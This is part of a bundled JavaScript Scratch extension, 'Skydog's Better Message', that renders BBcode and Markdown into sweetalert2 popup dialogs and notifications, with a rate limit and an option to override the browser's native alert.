        if ((ref = parent.children.slice(-1)[0]) != null ? ref.STRIP_OUTER : void 0) {
          text = text.replace(_START_NEWLINE_RE, "");
        }
        return new bbcode2.Tag(this.renderer, {
          text,
          parent
        });
      };
      Parser.prototype.parse = function(input, maxParsedable) {
        let cls;
        let current;
        let params;
        let root;
        let tag;
        let tagName;
        let token;
        let tokens;
        current = root = new bbcode2.Tag(this.renderer);
        tokens = input.split(_TOKEN_RE);
        let tagNumber = 0;
        let lastTag = null;
        while (tokens.length && tagNumber < maxParsedable) {
          tagNumber++;
          token = tokens.shift();
          if (token.match(_TOKEN_RE)) {
            params = this._parseParams(token.slice(1, -1));
            tagName = params[0][0];
            if (indexOf.call(current.CLOSED_BY, tagName) >= 0) {
              tokens.unshift(token);
              tagName = `/${current.name}`;
              params = [];
            }
            if (tagName[0] === "/") {
              tagName = tagName.slice(1);
              if (!(tagName in this.tags)) {
                this._createTextNode(current, token);
                continue;
              }
              if (current.name === tagName) {
                current = current.parent;
              }
            } else {
              cls = this.tags[tagName];
              if (!cls) {
                this._createTextNode(current, token);
                continue;
              }
              tag = new cls(this.renderer, {
                name: tagName,
                parent: current,
                params
              });
              if (!tag.SELF_CLOSE && (indexOf.call(tag.CLOSED_BY, tagName) < 0 || current.name !== tagName)) {
                current = tag;
              }
            }
          } else {
            this._createTextNode(current, token);
          }
        }
        return root;
      };
      Parser.prototype.toHTML = function(input, runtimes, maxParsedable) {
        let html;
        runtime = runtimes;
        return html = this.parse(input, maxParsedable).toHTML();
      };
      return Parser;
    }();
  }).call(obj);
  (function() {
    let MARKUP;
    let bbcode2;
    bbcode2 = this.bbcode;
    MARKUP = {
      bold: {
        keyCode: 66,
        title: "Bold (Ctrl+B)",
        placeholder: "bold text",
        open: "[b]",
        close: "[/b]"
      },
      italic: {
        keyCode: 73,
        title: "Italic (Ctrl+I)",
        placeholder: "italic text",
        open: "[i]",
        close: "[/i]"
      },
      center: {
        keyCode: 69,
        title: "Center (Ctrl+E)",
        placeholder: "center text",
        open: "[center]",
        close: "[/center]"
      },
      hyperlink: {
        keyCode: 76,
        title: "Hyperlink (Ctrl+L)",
        placeholder: "link text",
        open() {
          let url;
          url = prompt("Please enter the URL of your link", "http://") || "link url";
          return `[url=${url}]`;
        },
        close: "[/url]"
      },
      blockquote: {
        keyCode: 190,
        title: "Blockquote (Ctrl+.)",
        placeholder: "blockquote",
        open: "[quote]",
        close: "[/quote]"
      },
      code: {
        keyCode: 76,
        title: "Code (Ctrl+K)",
        placeholder: 'print("code sample");',
        open: "[code]",
        close: "[/code]"
      },
      image: {
        keyCode: 71,
        placeholder: "image url",
        open: "[img]",
        close: "[/img]"
      },
      nlist: {
        keyCode: 79,
        title: "Numbered List (Ctrl+O)",
        placeholder: "list item",
        open(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list=1\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "[list=1]\n	[*]";
          }
          return "	[*]";
        },
        close(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list=1\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "\n[/list]";
          }
        }
      },
      list: {
        keyCode: 85,
        title: "Bulleted List (Ctrl+O)",
        placeholder: "list item",
        open(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "[list]\n	[*]";
          }
          return "	[*]";
        },
        close(value) {
          let close;
          let open;
          let ref;
          let ref1;
          open = ((ref = value.match(/\[list\]/g)) != null ? ref.length : void 0) || 0;
          close = ((ref1 = value.match(/\[\/list\]/g)) != null ? ref1.length : void 0) || 0;
          if (open === close) {
            return "\n[/list]";
          }
        }
      },
      heading: {
        keyCode: 72,
        title: "Heading (Ctrl+H)",
        placeholder: "heading",
        open: "[h3]",
        close: "[/h3]",
        before: /\n$/,
        after: /^\n/
      },
      hrule: {
        keyCode: 82,
        title: "Hprizontal Rule (Ctrl+R)",
        open: "[hr]\n",
        before: /\n\n$/,
        after: /^\n\n/
      }
    };
    this.bbcode.Editor = function() {
      function Editor(textarea, markup) {
        this.markup = markup != null ? markup : MARKUP;
        this.$ = $(textarea);
        this.textarea = this.$[0];
        this.$.on(
          "keydown",
          /* @__PURE__ */ function(_this) {
            return function(e) {
              let end;
              let i;
              let len;
              let length;
              let line;
              let lines;
              let offset;
              let ref;
              let ref1;
              let ref2;
              let ref3;
              let selection;
              let start;
              let tab;
              if (e.which === 9) {
                selection = _this.getSelection();
                offset = 0;
                if (selection.start === selection.end && !e.shiftKey) {
                  offset++;
                  selection.value[1] = `	${selection.value[1]}`;
                  _this.setValue(selection.value.join(""));
                } else {
                  length = 0;
                  tab = false;
                  lines = [];
                  ref = _this.textarea.value.split("\n");
                  for (i = 0, len = ref.length; i < len; i++) {
                    line = ref[i];
                    ref1 = [length, length += line.length + 1], start = ref1[0], end = ref1[1];
                    if (!tab && start <= (ref2 = selection.start) && ref2 < end) {
                      tab = true;
                    }
                    if (tab) {
                      if (e.shiftKey) {
                        if (line[0] === "	") {
                          line = line.slice(1);
                          offset--;
                        }
                      } else {
                        line = `	${line}`;
                        offset++;
                      }
                      tab = !(start <= (ref3 = selection.end) && ref3 <= end);
                    }
                    lines.push(line);
                  }
                  _this.setValue(lines.join("\n"));
                }
                if (offset > 0) {
                  selection.start++;
                } else if (offset < 0) {
                  selection.start--;
                }
                _this.select(selection.start, selection.end + offset);
              } else if (!e.ctrlKey || e.altKey || _this.getRule(e.which) == null) {
                return true;
              } else {
                _this.replace(e.which);
              }
              return false;
            };
          }(this)
        );
      }
      Editor.prototype._escapeRe = function(pattern) {
        let escaped;
        let special;
        special = ["/", ".", "*", "+", "?", "|", "(", ")", "[", "]", "{", "}", "\\", "^", "$"];
        escaped = pattern.replace(new RegExp(`(\\${special.join("|\\")})`, "g"), "\\$1");
        return new RegExp(`^${escaped.replace(/\d+/, "\\d+")}$`);
      };
      Editor.prototype.getRule = function(keyCode) {
        let key;
        let ref;
        let rule;
        ref = this.markup;
        for (key in ref) {
          rule = ref[key];
          if (rule.keyCode === keyCode) {
            return rule;
          }
        }
      };
      Editor.prototype.replace = function(keyCode, value, text) {
        let close;
        let open;
        let replacement;
        let rule;
        let selection;
        let start;
        this.$.focus();
        selection = this.getSelection();
        rule = this.getRule(keyCode);
        value = this.textarea.value;
        open = (typeof rule.open === "function" ? rule.open(selection.value[0]) : rule.open) || "";
        close = (typeof rule.close === "function" ? rule.close(selection.value[2]) : rule.close) || "";
        if (this._escapeRe(open).test(value.slice(selection.start - open.length, selection.start)) && this._escapeRe(close).test(value.slice(selection.end, selection.end + close.length))) {
          start = selection.start - open.length;
          this.setValue(
            value.substr(0, start) + selection.value[1] + value.substr(selection.end + close.length, value.length)
          );
          return this.select(start, start + selection.value[1].length);
        }
        replacement = open + (text || selection.value[1] || rule.placeholder || "") + close;
        if (rule.before != null && !rule.before.test(selection.value[0])) {
          replacement = `

${replacement}`;
          selection.start += 2;
        }
        if (rule.after != null && !rule.after.test(selection.value[2])) {
          replacement += "\n\n";
          selection.end += 2;
        }
        this.setValue(selection.value[0] + replacement + selection.value[2]);
        return this.select(selection.start + open.length, selection.start + replacement.length - close.length);
      };
      Editor.prototype.setValue = function(value) {
        let position;
        position = this.$.scrollTop();
        this.$.val(value);
        return this.$.scrollTop(position);
      };
      Editor.prototype.select = function(start, end) {
        let range;
        let ref;
        if (((ref = document.selection) != null ? ref.createRange : void 0) != null) {
          range = this.textarea.createTextRange();
          range.collapse(true);
          range.moveStart("character", start);
          range.moveEnd("character", end - start);
          return range.select();
        }
        this.textarea.selectionStart = start;
        return this.textarea.selectionEnd = end;
      };
      Editor.prototype.getSelection = function() {
        let close;
        let end;
        let open;
        let range;
        let ref;
        let selection;
        let start;
        let storedRange;
        let value;
        value = this.textarea.value;
        if (((ref = document.selection) != null ? ref.createRange : void 0) != null) {
          selection = document.selection;
          if (!/testarea/i.test(this.textarea.tagName)) {
            range = selection.createRange().duplicate();
            range.moveEnd("character", value.length);
            start = range.text === "" ? value.length : value.lastIndexOf(range.text);
            range = selection.createRange().duplicate();
            range.moveStart("character", -value.length);
            end = range.text.length + 1;
          } else {
            range = selection.createRange();
            storedRange = range.duplicate();
            storedRange.moveToElementText(this.textarea);
            storedRange.setEndPoint("EndToEnd", range);
            start = storedRange.text.length - range.text.length;
            end = start + range.text.length;
          }
        } else {
          start = this.textarea.selectionStart;
          end = this.textarea.selectionEnd;
        }
        open = value.substring(0, start);
        close = value.substring(end, value.length);
        return selection = {
          start,
          end,
          value: [open, value.substring(start, end), close]
        };
      };
      return Editor;
    }();
  }).call(obj);
  var { bbcode } = obj;
  var bbcode_default = bbcode;

  // src/index.js
  var import_sweetalert2 = __toESM(require_sweetalert2_all());
  (function(Scratch2) {
    let lastOpenTime = 0;
    const BetterMsgIconUrl = "https://m.ccw.site/user_projects_assets/0d3ec414f0339216c61c75922f68757f.svg";
    const BetterMsgPictureUrl = "https://m.ccw.site/user_projects_assets/5db8a064cf118bb46563e02718f3d761.svg";
    if (Scratch2.extensions.unsandboxed === false) {
      throw new Error("Sandboxed mode is not supported");
    }
    Scratch2.translate.setup({
      "zh-cn": {
        "BetterMsg.name": "\u66F4\u597D\u7684\u5F39\u7A97",
        // 注：虽然我使用的库支持HTML，但是有监管风险，故没有使用。
        "BetterMsg.help": "\u6240\u6709\u5F39\u7A97\u652F\u6301BBcode\u548CMarkdown\uFF0C\u4F18\u5148\u89E3\u6790Markdown",
        "BetterMsg.thank": "\u611F\u8C22 \u767D\u732B@CCW \u63D0\u4F9B\u7684BBcode\u89E3\u6790\u4F9D\u8D56\uFF01",
        "BetterMsg.openModal": "\u5F39\u51FA\u8986\u76D6\u5F0F\u6A21\u6001\u6846\uFF0C\u7C7B\u578B[type]\u6807\u9898[title]\u5185\u5BB9[content][anim] |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.openModalAutoClose": "\u5F39\u51FA\u8986\u76D6\u5F0F\u6A21\u6001\u6846\uFF0C\u7C7B\u578B[type]\u6807\u9898[title]\u5185\u5BB9[content]\u5E76\u5728[time]\u79D2\u540E\u81EA\u52A8\u5173\u95ED[anim] |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.openModalRight": "\u5F39\u51FA\u53F3\u4E0A\u89D2\u901A\u77E5\u5F39\u7A97\uFF0C\u7C7B\u578B[type]\u5185\u5BB9[content]\u5E76\u5728[time]\u79D2\u540E\u81EA\u52A8\u5173\u95ED |\u53EF\u9009| \u5B57\u4F53\u989C\u827216\u8FDB\u5236\u4EE3\u7801[color] ",
        "BetterMsg.success": "\u6210\u529F",
        "BetterMsg.warning": "\u8B66\u544A",
        "BetterMsg.error": "\u9519\u8BEF",
        "BetterMsg.info": "\u4FE1\u606F",
        "BetterMsg.question": "\u95EE\u9898",
        "BetterMsg.animOk": "\u9644\u5E26\u52A8\u753B",
        "BetterMsg.animNo": "\u4E0D\u9644\u5E26\u52A8\u753B",
        "BetterMsg.alerts": "[open]\u6D4F\u89C8\u5668\u539F\u751Falert\u5F39\u7A97",
        "BetterMsg.oalert": "\u8986\u5199",
        "BetterMsg.calert": "\u8FD8\u539F",
        "BetterMsg.error.time": "\u8C03\u7528\u95F4\u9694\u4E0D\u5F97\u5C0F\u4E8E3\u79D2"
      },
      en: {
        "BetterMsg.name": "Skydog's Better Message",
        "BetterMsg.help": "All popups support BBcode and Markdown, prioritizing parsing of Markdown",
        "BetterMsg.thank": "Thanks to \u767D\u732B @ CCW for the BBcode parsing dependency!",
        "BetterMsg.openModal": "Open modal dialog, type [type] title [title] content [content][anim] |optional| font color hex code [color]",
        "BetterMsg.openModalAutoClose": "Open modal dialog, type [type] title [title] content [content] and close in [time] seconds[anim] |optional| font color hex code [color]",
        "BetterMsg.openModalRight": "Open notification pop-up, type [type] content [content] and close in [time] seconds |optional| font color hex code [color]",
        "BetterMsg.success": "Success",
        "BetterMsg.warning": "Warning",
        "BetterMsg.error": "Error",
        "BetterMsg.info": "Info",
        "BetterMsg.question": "Question",
        "BetterMsg.animOk": "With animation",
        "BetterMsg.animNo": "Without animation",
        "BetterMsg.alert": "[open] browser native alert dialog",
        "BetterMsg.oalert": "Override",
        "BetterMsg.calert": "Restore",
        "BetterMsg.error.time": "Call interval cannot be less than 3 seconds"
      }
    });
    function i10n(id) {
      return Scratch2.translate({ id, default: id, description: id });
    }
    class BetterMsg {
      constructor(runtime2) {
        this.runtime = runtime2;
        this.maxParsedable = 100;
      }
      getInfo() {
        return {
          id: "BetterMsg",
          name: i10n("BetterMsg.name"),
          color1: "#d9963a",
          color2: "#d9963a",
          blockIconURI: BetterMsgIconUrl,
          menuIconURI: BetterMsgIconUrl,
          blocks: [
            "---" + i10n("BetterMsg.help"),
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModal",
              text: i10n("BetterMsg.openModal"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                title: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                anim: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "anim"
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModalAutoClose",
              text: i10n("BetterMsg.openModalAutoClose"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                title: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                anim: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "anim"
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                },
                time: {
                  type: Scratch2.ArgumentType.NUMBER,
                  defaultValue: 3
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "openModalRight",
              text: i10n("BetterMsg.openModalRight"),
              arguments: {
                type: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "type"
                },
                content: {
                  type: Scratch2.ArgumentType.STRING,
                  defaultValue: i10n("BetterMsg.success")
                },
                time: {
                  type: Scratch2.ArgumentType.NUMBER,
                  defaultValue: 3
                },
                color: {
                  type: Scratch2.ArgumentType.COLOR,
                  defaultValue: "#4CAF50"
                }
              }
            },
            {
              blockType: Scratch2.BlockType.COMMAND,
              opcode: "alerts",
              text: i10n("BetterMsg.alerts"),
              arguments: {
                open: {
                  type: Scratch2.ArgumentType.STRING,
                  menu: "open"
                }
              }
            },
            "---" + i10n("BetterMsg.thank")
          ],
          menus: {
            type: [
              {
                text: i10n("BetterMsg.success"),
                value: "success"
              },
              {
                text: i10n("BetterMsg.warning"),
                value: "warning"
              },
              {
                text: i10n("BetterMsg.error"),
                value: "error"
              },
              {
                text: i10n("BetterMsg.info"),
                value: "info"
              },
              {
                text: i10n("BetterMsg.question"),
                value: "question"
              }
            ],
            anim: [
              {
                text: i10n("BetterMsg.animOk"),
                value: "true"
              },
              {
                text: i10n("BetterMsg.animNo"),
                value: "false"
              }
            ],
            open: [
              {
                text: i10n("BetterMsg.oalert"),
                value: "open"
              },
              {
                text: i10n("BetterMsg.calert"),
                value: "close"
              }
            ]
          }
        };
      }
      // code here
      openModal(args) {
        if (lastOpenTime !== 0) {
          if (Date.now() - lastOpenTime < 3e3) {
            return i10n("BetterMsg.error.time");
          } else {
            lastOpenTime = Date.now();
          }
        } else {
          lastOpenTime = Date.now();
        }
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const content = "[md]" + args.content + "[/md]";
        const title = "[md]" + args.title + "[/md]";
        const type = args.type;
        const anim = args.anim;
        const color = args.color;
        if (anim === "true") {
          console.log("with animation");
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            showClass: {
              popup: `
              animate__animated
              animate__fadeInUp
              animate__faster
            `
            },
            hideClass: {
              popup: `
              animate__animated
              animate__fadeOutDown
              animate__faster
            `
            }
          });
        } else {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type
          });
        }
      }
      openModalAutoClose(args) {
        if (lastOpenTime !== 0) {
          if (Date.now() - lastOpenTime < 3e3) {
            return i10n("BetterMsg.error.time");
          } else {
            lastOpenTime = Date.now();
          }
        } else {
          lastOpenTime = Date.now();
        }
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const content = "[md]" + args.content + "[/md]";
        const title = "[md]" + args.title + "[/md]";
        const type = args.type;
        const anim = args.anim;
        const color = args.color;
        const time = args.time;
        if (anim === "true") {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            timer: time * 1e3,
            showClass: {
              popup: `
              animate__animated
              animate__fadeInUp
              animate__faster
            `
            },
            hideClass: {
              popup: `
              animate__animated
              animate__fadeOutDown
              animate__faster
            `
            }
          });
        } else {
          import_sweetalert2.default.fire({
            title: new bbcode_default.Parser().toHTML(title, this.runtime, this.maxParsedable),
            color,
            html: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
            icon: type,
            timer: time * 1e3
          });
        }
      }
      openModalRight(args) {
        if (lastOpenTime !== 0) {
          if (Date.now() - lastOpenTime < 3e3) {
            return i10n("BetterMsg.error.time");
          } else {
            lastOpenTime = Date.now();
          }
        } else {
          lastOpenTime = Date.now();
        }
        const link = document.querySelector("#SkydogBetterMsg");
        if (!link) {
          const link2 = document.createElement("link");
          link2.id = "SkydogBetterMsg";
          link2.rel = "stylesheet";
          link2.href = "https://s4.zstatic.net/ajax/libs/animate.css/4.1.1/animate.min.css";
          document.head.appendChild(link2);
        }
        const color = args.color;
        const content = "[md]" + args.content + "[/md]";
        const type = args.type;
        const time = args.time * 1e3;
        import_sweetalert2.default.fire({
          toast: true,
          position: "top-end",
          showConfirmButton: false,
          timer: time,
          type,
          title: new bbcode_default.Parser().toHTML(content, this.runtime, this.maxParsedable),
          color
        });
      }
      alerts(args) {
        const open = args.open;
        if (open === "open") {
          window.alert = (e) => {
            import_sweetalert2.default.fire({
              type: "info",
              titleText: e
            });
          };
        } else {
          const f = document.createElement("iframe");
          f.style.cssText = "border:0;width:0;height:0;display:none";
          document.body.appendChild(f);
          const d = f.contentWindow.document;
          d.write(
            '<script type="text/javascript">window.parent.alert = alert;<\/script>'
          );
          d.close();
        }
      }
    }
    window.tempExt = {
      Extension: BetterMsg,
      info: {
        name: "BetterMsg.name",
        description: "BetterMsg.descp",
        extensionId: "BetterMsg",
        iconURL: BetterMsgPictureUrl,
        insetIconURL: BetterMsgIconUrl,
        featured: true,
        disabled: false,
        collaborator: "\u591Abug\u7684\u5578\u5929\u72AC @ CCW"
      },
      l10n: {
        "zh-cn": {
          "BetterMsg.name": i10n("BetterMsg.name"),
          "BetterMsg.descp": "\u66F4\u597D\u7684\u5F39\u7A97\uFF01\u7F8E\u89C2|\u5B9E\u7528|\u4E30\u5BCC"
        },
        en: {
          "BetterMsg.name": "Skydog's Better Message",
          "BetterMsg.descp": "Better pop-up windows! Beautiful | Practical | Rich"
        }
      }
    };
  })(Scratch);
})();
/*! showdown v 2.1.0 - 21-04-2022 */
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.11.1
  * Released under the MIT License.
  *)
*/
